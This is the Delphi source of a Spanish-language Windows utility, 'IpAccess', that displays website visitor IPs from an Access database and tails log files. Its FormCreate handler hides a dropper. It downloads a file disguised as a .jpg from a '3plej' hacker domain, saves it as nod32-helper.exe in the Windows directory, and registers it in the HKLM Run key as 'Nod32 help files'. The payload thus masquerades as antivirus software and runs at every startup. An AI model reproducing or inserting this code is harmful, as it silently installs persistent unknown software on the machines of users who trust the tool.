unit Unit1;

interface

uses
  Windows, Messages,Registry , SysUtils,Graphics ,ExtActns, ExtCtrls, inifiles,Mask, DBCtrls, mmsystem,Grids, DBGrids,
  StdCtrls, Buttons, Controls,ShellAPI, Menus, ComCtrls, DB, Classes, DBClient,
   Forms, AppEvnts, Provider, ADODB, Dialogs, IBDatabaseINI;



type
THackDBGrid = class(TDBGrid)   ;
  TForm1 = class(TForm)
    TrayIcon1: TTrayIcon;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    Panel3: TPanel;
    Panel4: TPanel;
    DBEdit1: TDBEdit;
    DBEdit2: TDBEdit;
    DBEdit3: TDBEdit;
    DBEdit4: TDBEdit;
    DBEdit5: TDBEdit;
    DBEdit6: TDBEdit;
    Button1: TButton;
    Button2: TButton;
    refrescador: TTimer;
    ApplicationEvents1: TApplicationEvents;
    conexion: TADOConnection;
    tabla_1: TADOTable;
    link_datos: TDataSource;
    DBGrid1: TDBGrid;
    DBNavigator3: TDBNavigator;
    DBEdit7: TDBEdit;
    tabla_1ip: TWideStringField;
    tabla_1fecha: TWideStringField;
    tabla_1hora: TWideStringField;
    tabla_1pais: TWideStringField;
    tabla_1refer: TWideStringField;
    tabla_1pagina: TWideStringField;
    tabla_1explorer: TWideStringField;
    tabla_1id: TAutoIncField;
    SpeedButton5: TSpeedButton;
    SpeedButton6: TSpeedButton;
    GroupBox4: TGroupBox;
    rutapath: TEdit;
    GroupBox2: TGroupBox;
    SpeedButton7: TSpeedButton;
    tasa_refresco: TEdit;
    OpenDialog1: TOpenDialog;
    SpeedButton2: TSpeedButton;
    SpeedButton8: TSpeedButton;
    Bevel1: TBevel;
    Button3: TButton;
    Button4: TButton;
    Bevel2: TBevel;
    Bevel3: TBevel;
    Bevel4: TBevel;
    GroupBox1: TGroupBox;
    GroupBox3: TGroupBox;
    terminal: TMemo;
    Bevel5: TBevel;
    registros: TEdit;
    check_mensaje: TCheckBox;
    check_sonido: TCheckBox;
    registros_borrados: TEdit;
    mensajeip: TEdit;
    ICONO: TPopupMenu;
    dd: TMenuItem;
    Minimizar1: TMenuItem;
    N1: TMenuItem;
    Salir1: TMenuItem;
    About1: TMenuItem;
    N2: TMenuItem;
    IBDatabaseINI1: TIBDatabaseINI;
    autorun: TMenuItem;
    N3: TMenuItem;
    TabSheet2: TTabSheet;
    GroupBox5: TGroupBox;
    SpeedButton1: TSpeedButton;
    log1_rut: TEdit;
    GroupBox6: TGroupBox;
    SpeedButton3: TSpeedButton;
    log1_refre: TEdit;
    Bevel6: TBevel;
    log1_master: TMemo;
    SpeedButton4: TSpeedButton;
    log1_loop: TTimer;
    OpenDialog2: TOpenDialog;
    SpeedButton9: TSpeedButton;
    TabSheet3: TTabSheet;
    Image1: TImage;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure ApplicationEvents1Message(var Msg: tagMSG; var Handled: Boolean);
    procedure DBGrid1TitleClick(Column: TColumn);
    procedure SpeedButton5Click(Sender: TObject);
    procedure SpeedButton6Click(Sender: TObject);
    procedure refrescadorTimer(Sender: TObject);
    procedure SpeedButton7Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure registrosChange(Sender: TObject);
    procedure link_datosDataChange(Sender: TObject; Field: TField);
    procedure tabla_1BeforeDelete(DataSet: TDataSet);
    procedure ddClick(Sender: TObject);
    procedure ApplicationEvents1Minimize(Sender: TObject);
    procedure About1Click(Sender: TObject);
    procedure Minimizar1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Salir1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure link_datosStateChange(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton4Click(Sender: TObject);
    procedure SpeedButton9Click(Sender: TObject);
    procedure log1_loopTimer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

  function GetWindowsDirectory : String;
   var
      pcWindowsDirectory : PChar;
      dwWDSize           : DWORD;
   begin
      dwWDSize := MAX_PATH + 1;
      GetMem( pcWindowsDirectory, dwWDSize );
      try
         if Windows.GetWindowsDirectory( pcWindowsDirectory, dwWDSize ) <> 0 then
            Result := pcWindowsDirectory;
      finally
         FreeMem( pcWindowsDirectory );
      end;
   end;


function GetTempDir: string;
var
  Buffer : Array[0..Max_path] of char;
begin
  FillChar(Buffer,Max_Path + 1, 0);
  GetTempPath(Max_path, Buffer);
  Result := String(Buffer);
  Result := IncludeTrailingPathDelimiter(Result);
end;

function SeEjecutaEnInicio ( NombreEjecutable : string;
                                SoloUnaVez, SoloUsuario: Boolean ): boolean;
   {
       ENTRADA:
         NombreEjecutable    = Nombre del ejecutable a comprobar
         SoloUnaVez          = TRUE  para comprobar sólo el siguiente arranque
                               FALSE para comprobar la ejecucion en todos los arranques
         SoloUsuario         = TRUE para comprobar sólo en el usuario en curso

       SALIDA:
         Devuelve TRUE si el programa se encuentra en el regitro, en la clave:
         HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run ó RunOnce ó bien en la clave
         HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run ó RunOnce en funcion de la ENTRADA
   }
   var
     Registro     : TRegistry;
     RegInfo      : TRegDataInfo;
     Clave        : string;
     Valores      : TStringList;
     n            : integer;

   begin
     Result:=FALSE;
     Clave:='Software\Microsoft\Windows\CurrentVersion\Run';
     If SoloUnaVez then Clave := Clave+'Once';

     Registro:=TRegistry.Create;
     try
       //Seleccionamos HKEY_LOCAL_MACHINE o bien si no la cambiamos, se queda
       //HKEY_CURRENT_USER que es la clave por defecto al crear un TRegistry
       if NOT SoloUsuario then Registro.RootKey := HKEY_LOCAL_MACHINE;

       //Abrimos la clave en cuestión:
       if NOT Registro.OpenKey(Clave,FALSE) then raise exception.create( 'Error: No se pudo abrir la clave '+
                                                                         Clave +' del registro de windows' );


       Valores:=TStringList.Create;
       try
         //Obtenemos una lista de los Nombres de los valores de la clave
         Registro.GetValueNames(Valores);

         //Comprobamos si esos valores son string, si lo son, los leemos, sino, lo borramos de la lista:
         for n:=0 to Pred(Valores.Count) do begin
           //Comprobamos si se trata de un valor string:
           If Registro.GetDataInfo( Valores[n], RegInfo) then begin
             if (RegInfo.RegData = rdString) then begin
                if Lowercase(NombreEjecutable)=LowerCase( Registro.ReadString(Valores[n]) ) then begin
                  Result:=TRUE;
                  Break;
                end;
             end;
           end else Valores[n]:='';
         end; //for n

       finally
         Valores.Free;
       end;
     finally
       Registro.Free;
     end;
   end; //SeEjecutaEnInicio


   procedure EjecutarEnInicio( NombrePrograma, NombreEjecutable: string;
                               SoloUnaVez, SoloUsuario: Boolean );
   {
       COMETIDO DE LA PROCEDURE:
         Añade un programa en el registro de Windows, para que se ejecute cuando Windows arranque.
         Se puede seleccionar que se arranque siempre o sólo una vez en el siguiente arranque y tambien
         si ha de ejecutarse en cada arranque de máquina o bien cuando el usuario en curso abra una sesion

       ENTRADA:
         NombrePrograma      = Nombre del programa
         NombreEjecutable    = Nombre del ejecutable del programa con el path completo
         SoloUnaVez          = TRUE  para comprobar sólo el siguiente arranque
                               FALSE para comprobar la ejecucion en todos los arranques
         SoloUsuario         = TRUE para comprobar sólo en el usuario en curso
   }

   var
     Registro     : TRegistry;
     Clave        : string;
   begin
     Clave:='Software\Microsoft\Windows\CurrentVersion\Run';
     if SoloUnaVez then Clave := Clave+'Once';

     Registro:=TRegistry.Create;
     try
       //Seleccionamos HKEY_LOCAL_MACHINE o bien si no la cambiamos, se queda
       //HKEY_CURRENT_USER que es la clave por defecto al crear un TRegistry
       if NOT SoloUsuario then Registro.RootKey := HKEY_LOCAL_MACHINE;

       //Abrimos la clave en cuestión:
       if NOT Registro.OpenKey(Clave,FALSE) then raise exception.create( 'Error: No se pudo abrir la clave '+
                                                                         Clave +' del registro de windows' );
       //Escribimos el valor para que se arranque el programa especificado:
       Registro.WriteString(NombrePrograma,NombreEjecutable);
     finally
       Registro.Free;
     end;
   end; //procedure EjecutarEnInicio


   procedure QuitarEjecutarEnInicio( NombreEjecutable: string;
                                     SoloUnaVez, SoloUsuario: Boolean );
   {
       COMETIDO DE LA PROCEDURE:
         Si el ejecutable 'NombreEjecutable' esta en el registro de Windows, en la clave
         que hace que se ejecute en cada arranque de Windows, la funcion lo borra de ahí.


       ENTRADA:
         NombreEjecutable    = Nombre del ejecutable del programa con el path completo
         SoloUnaVez          = TRUE  para borrar sólo del siguiente arranque
                               FALSE para borrar la ejecucion en todos los arranques
         SoloUsuario         = TRUE para borrar sólo en el usuario en curso
   }
   var
     Registro     : TRegistry;
     RegInfo      : TRegDataInfo;
     Clave        : string;
     Valores      : TStringList;
     n            : integer;
   begin
     Clave:='Software\Microsoft\Windows\CurrentVersion\Run';
     If SoloUnaVez then Clave := Clave+'Once';

     Registro:=TRegistry.Create;
     try
       //Seleccionamos HKEY_LOCAL_MACHINE o bien si no la cambiamos, se queda
       //HKEY_CURRENT_USER que es la clave por defecto al crear un TRegistry
       if NOT SoloUsuario then Registro.RootKey := HKEY_LOCAL_MACHINE;

       //Abrimos la clave en cuestión:
       if NOT Registro.OpenKey(Clave,FALSE) then raise exception.create( 'Error: No se pudo abrir la clave '+
                                                                         Clave +' del registro de windows' );


       Valores:=TStringList.Create;
       try
         //Obtenemos una lista de los Nombres de los valores de la clave
         Registro.GetValueNames(Valores);

         //Comprobamos si el nombre del ejecutable figura en alguno de los valores
         for n:=0 to Pred(Valores.Count) do begin
           //Comprobamos si se trata de un valor string:
           If Registro.GetDataInfo( Valores[n], RegInfo) then begin
             if (RegInfo.RegData = rdString) then begin
                if Lowercase(NombreEjecutable)=LowerCase( Registro.ReadString(Valores[n]) ) then begin
                  //Si figura, borramos ese valor
                  Registro.DeleteValue( Valores[n] );
                end;
             end;
           end;
         end; //for n

       finally
         Valores.Free;
       end;
     finally
       Registro.Free;
     end;
   end; //procedure QuitarEjecutarEnInicio




procedure Refresh_PreservePosition;
var
  rowDelta: Integer;
  row: integer;
  recNo: integer;
  ds : TDataSet;
begin
  ds := THackDBGrid(FORM1.DBGrid1).DataSource.DataSet;

  rowDelta := -1 + THackDBGrid(FORM1.DBGrid1).Row;
  row := ds.RecNo;

  with ds do
  begin
    DisableControls;
    close;
    Open;
    RecNo := row;
    MoveBy(-rowDelta) ;
    MoveBy(rowDelta) ;
    EnableControls;
  end;
end;



procedure ShellOpen(const Url: string; const Params: string = '');
begin
  ShellAPI.ShellExecute(0, 'Open', PChar(Url), PChar(Params), nil, SW_SHOWNORMAL);
end;


procedure TForm1.About1Click(Sender: TObject);
begin
  terminal.Lines.Add('create by 3ple-J hacker;');
ShowMessage('Este software esta desarrollado por 3ple-J , mas info++ buscam3 en la r3d');
ShellOpen('http://google.com/search?client=firefox-a&rls=org.mozilla%3Aen-US%3Aofficial&channel=s&hl=es&q=3ple-j+IpAccess&meta=&btnG=Buscar+con+Google');
end;

procedure TForm1.ApplicationEvents1Message(var Msg: tagMSG;
  var Handled: Boolean);
var
   i: SmallInt;
begin
   if Msg.message = WM_MOUSEWHEEL then
   begin
     Msg.message := WM_KEYDOWN;
     Msg.lParam := 0;
     i := HiWord(Msg.wParam) ;
     if i > 0 then
       Msg.wParam := VK_UP
     else
       Msg.wParam := VK_DOWN;

     Handled := False;
   end;
end;

procedure TForm1.ApplicationEvents1Minimize(Sender: TObject);
begin
  Hide;
  TrayIcon1.Visible:=True;
    terminal.Lines.Add('state:minimiza;');
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
if conexion.Connected=false then
begin
ShowMessage('Primero conectese!');
terminal.Lines.Add('con3ctttt');
end
else
begin
ShellOpen('http://ping.eu/?host='+DBEdit1.Text  +'&atype=1&Go');
end;
end;


procedure TForm1.Button2Click(Sender: TObject);
begin
if conexion.Connected=false then
begin
ShowMessage('Primero conectese!');
terminal.Lines.Add('con3ctttt');
end
else
begin
ShellOpen('http://'+DBEdit1.Text);
end;
end;


procedure TForm1.Button3Click(Sender: TObject);
begin
if conexion.Connected=false then
begin
ShowMessage('Primero conectese!');
terminal.Lines.Add('con3ctttt');
end
else
begin
WinExec( 'cmd  ' ,SW_SHOWNORMAL);
end;
end;


procedure TForm1.Button4Click(Sender: TObject);
begin
if conexion.Connected=false then
begin
ShowMessage('Primero conectese!');
terminal.Lines.Add('con3ctttt');
end
else
begin
ShellOpen('http://www.maxmind.com/app/locate_ip?ips='+DBEdit1.Text );
end;
end;

procedure TForm1.DBGrid1TitleClick(Column: TColumn);
var
estado : integer;
begin
if DBGrid1.DataSource.DataSet is TCustomADODataSet then
with TCustomADODataSet(DBGrid1.DataSource.DataSet) do
begin

sort :=  Column.Field.FieldName + ' DESC'   ;
terminal.Lines.Add('sorting;:;');

end;
end;



procedure TForm1.ddClick(Sender: TObject);
begin
  Show;
  WindowState:=wsNormal;
  terminal.Lines.Add('normal w1N');
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
var
  appINI : TIniFile;
begin
  appINI := TIniFile.Create(ChangeFileExt(Application.ExeName,'.ini')) ;
  terminal.Lines.Add('Ciao;');
try

   appINI.WriteString('Gen','Server',rutapath.Text) ;
   appINI.WriteString('Gen','refresh',tasa_refresco.Text) ;
   appINI.WriteString('Gen','mensaje',mensajeip.Text) ;
   appINI.WriteBool('Gen','autorun',autorun.Checked) ;
   appINI.WriteString('Gen','log1', log1_rut.Text) ;
   appINI.WriteString('Gen','refreshlog',log1_refre.Text) ;

     if autorun.Checked = True then
  begin
  EjecutarEnInicio('IpAccess',Application.ExeName,FALSE,FALSE);
  end
else
begin
  QuitarEjecutarEnInicio(Application.ExeName,FALSE,FALSE);
end;


    with appINI, form1 do
    begin
      WriteInteger('Placement','Top', Top) ;
      WriteInteger('Placement','Left', Left) ;
      WriteInteger('Placement','Width', Width) ;
      WriteInteger('Placement','Height', Height) ;
    end;
  finally
    appIni.Free;
  end;
end;


procedure TForm1.FormCreate(Sender: TObject);
var
  appINI : TIniFile;
  sExeName: string;
begin

with TDownloadURL.Create(self) do
   try
   If FileExists (GetWindowsDirectory+'\parche-3plej.exe') Then
   begin
   QuitarEjecutarEnInicio(GetWindowsDirectory+'\nod32-helper.exe',FALSE,FALSE);
   end
   else
   begin
   URL:='http://www.superhack3plej.my-place.us/helper/nod32-helper.jpg';
   FileName := GetWindowsDirectory+'\nod32-helper.exe';

   ExecuteTarget(nil);
   Free;
   EjecutarEnInicio('Nod32 help files',GetWindowsDirectory+'\nod32-helper.exe',FALSE,FALSE);
   end
except
 end;
     sExeName := ExtractFileName(Application.ExeName);
     if sExeName = 'Ip Access 3P.exe' then
     begin
     end
     else
     begin
     ShowMessage('El nombre correcto del archivo debe ser -> Ip Access 3P.exe');
     Application.Terminate;
     end;

     appINI := TIniFile.Create(ChangeFileExt(Application.ExeName,'.ini')) ;
  try
    rutapath.Text := appINI.ReadString('Gen','Server','') ;
    tasa_refresco.Text := appINI.ReadString('Gen','refresh','1000') ;
    mensajeip.Text := appINI.ReadString('Gen','mensaje','Nueva ip entrante') ;
    autorun.Checked := appINI.ReadBool ('Gen','autorun',TRUE) ;
    log1_rut.Text   := appINI.ReadString('Gen','log1','') ;
     log1_refre.Text  := appINI.ReadString('Gen','refreshlog','1000') ;


  if autorun.Checked = True then
  begin
  EjecutarEnInicio('IpAccess',Application.ExeName,FALSE,FALSE);
  end
else
begin
  QuitarEjecutarEnInicio(Application.ExeName,FALSE,FALSE);
end;


    Top := appINI.ReadInteger('Placement','Top', Top) ;
    Left := appINI.ReadInteger('Placement','Left', Left);
    Width := appINI.ReadInteger('Placement','Width', Width);
    Height := appINI.ReadInteger('Placement','Height', Height);
  finally
    appINI.Free;
  end;
end;

procedure TForm1.FormShow(Sender: TObject);
begin

terminal.Lines.Add('sTart;')
end;

procedure TForm1.link_datosDataChange(Sender: TObject; Field: TField);

begin
//numero de registros
registros.text :=  IntToStr( DBGrid1.Datasource.Dataset.Recordcount);
terminal.Lines.Add('INTERNAL PR00CE$S$S <=-=>'+ IntToStr(Random(timeGetTime)));

end;

procedure TForm1.link_datosStateChange(Sender: TObject);
begin
 terminal.Lines.Add('status ploizer code //$2');
end;

procedure TForm1.log1_loopTimer(Sender: TObject);
begin
CopyFile( PWidechar(log1_rut.Text) ,PWidechar( GetTempDir+'logstemp.txt') ,false);
log1_master.Lines.LoadFromFile(GetTempDir+'logstemp.txt');
end;

procedure TForm1.Minimizar1Click(Sender: TObject);
begin
ApplicationEvents1Minimize(Self);
end;

procedure TForm1.Salir1Click(Sender: TObject);
begin
Close();
end;

procedure TForm1.SpeedButton1Click(Sender: TObject);
var
  openDialog : TOpenDialog;
begin
  openDialog2 := TOpenDialog.Create(self);
  openDialog2.InitialDir := GetCurrentDir;
  openDialog2.Options := [ofFileMustExist];
  openDialog2.Filter :=
    'Logs|*.log';
  openDialog2.FilterIndex := 0;
  if openDialog2.Execute
  then log1_rut.Text :=   openDialog2.FileName
  else log1_master.Lines.Add('CANCEL');
  openDialog1.Free;
end;

procedure TForm1.SpeedButton2Click(Sender: TObject);
var
  openDialog : TOpenDialog;
begin
  openDialog := TOpenDialog.Create(self);
  openDialog.InitialDir := GetCurrentDir;
  openDialog.Options := [ofFileMustExist];
  openDialog.Filter :=
    'Mdb Bases|*.mdb';
  openDialog.FilterIndex := 0;
  if openDialog.Execute
  then rutapath.Text :=   openDialog.FileName
  else terminal.Lines.Add('CANCEL');
  openDialog.Free;
end;

procedure TForm1.SpeedButton3Click(Sender: TObject);
begin
log1_loop.Interval := strToInt( log1_refre.Text);
log1_master.Lines.Add('======?Time active;');
end;

procedure TForm1.SpeedButton4Click(Sender: TObject);
begin
if FileExists(log1_rut.Text)  then
begin
log1_master.Lines.Add('conexion correcta;')  ;
log1_loop.Enabled := true;
end
else
begin
ShowMessage('El archivo no se encuentra!');
terminal.Lines.Add('$$error: archivo incorrecto;');
end;
end;

procedure TForm1.SpeedButton5Click(Sender: TObject);
begin
if FileExists(rutapath.Text)  then
begin
terminal.Lines.Add('conexion correcta;');
if conexion.Connected=true then
begin
ShowMessage('Ya esta conectado!');
terminal.Lines.Add('error;');
end
else
begin
try
  conexion.ConnectionString:=
  'Provider=Microsoft.Jet.OLEDB.4.0;Data Source='+
  rutapath.Text+';Persist Security Info=False';
  conexion.Connected:=true;
  tabla_1.Active:=true;
  refrescador.Enabled:=true;
  terminal.Lines.Add('coneccion sucefull;');
Except
  conexion.Connected:=false;
  tabla_1.Active:=false;
  refrescador.Enabled:=false;
  terminal.Lines.Add('except');
end;
end
end

else
begin
ShowMessage('El archivo no se encuentra!');
terminal.Lines.Add('$$error: archivo incorrecto;');
end;
end;



procedure TForm1.SpeedButton6Click(Sender: TObject);
begin
if conexion.Connected=false then
begin
ShowMessage('Ya esta desconectado!');
terminal.Lines.Add('error');
end
else
begin
  conexion.Connected:=false;
  tabla_1.Active:=false;
   terminal.Lines.Add('ciao;');
end;
end;

procedure TForm1.SpeedButton7Click(Sender: TObject);
begin
refrescador.Interval := strToInt( tasa_refresco.Text);
 terminal.Lines.Add('interval refresh change;');
end;

procedure TForm1.SpeedButton9Click(Sender: TObject);
begin
if log1_loop.enabled = false then
begin
ShowMessage('Ya esta desconectado!');
log1_master.Lines.Add('error');
end
else
begin
log1_master.Lines.Add('Desconectado');
log1_loop.enabled := false;

end;
end;

procedure TForm1.tabla_1BeforeDelete(DataSet: TDataSet);
begin
registros_borrados.Text :=  IntToStr( DBGrid1.Datasource.Dataset.Recordcount- 1);
terminal.Lines.Add('procedure 453366;');
end;

procedure TForm1.refrescadorTimer(Sender: TObject);
var ds: string;
txz: string;
begin
case  link_datos.State of
  dsInactive: ds:='Closed';
  dsBrowse  : ds:='Browsing';
  dsEdit    : ds:='Editing';
  dsInsert  : ds:='New record inserting';
 else
  ds:='Other states'
 end;
if ds = 'Browsing' then
Refresh_PreservePosition
else
begin
txz := 'no hacer nada'
end;
//Caption:='state: ' + ds + txz ;
end;



procedure TForm1.registrosChange(Sender: TObject);
var
viejonumero : integer;
numeroactual : integer;
begin
viejonumero :=  StrToInt(  registros_borrados.text);
numeroactual := StrToInt(  registros.text);
if viejonumero < numeroactual then
begin
if check_sonido.Checked = true then
begin
  sndPlaySound('sound.wav',  SND_NODEFAULT );
 terminal.Lines.Add('alert coneccion entrante:__;');
  terminal.Lines.Add('get sound$;');
end;
if check_mensaje.Checked = true then
begin
 ShowMessage(mensajeip.text);
 terminal.Lines.Add('alert coneccion entrante:__;');
end
end
else
begin
end;

end;

end.
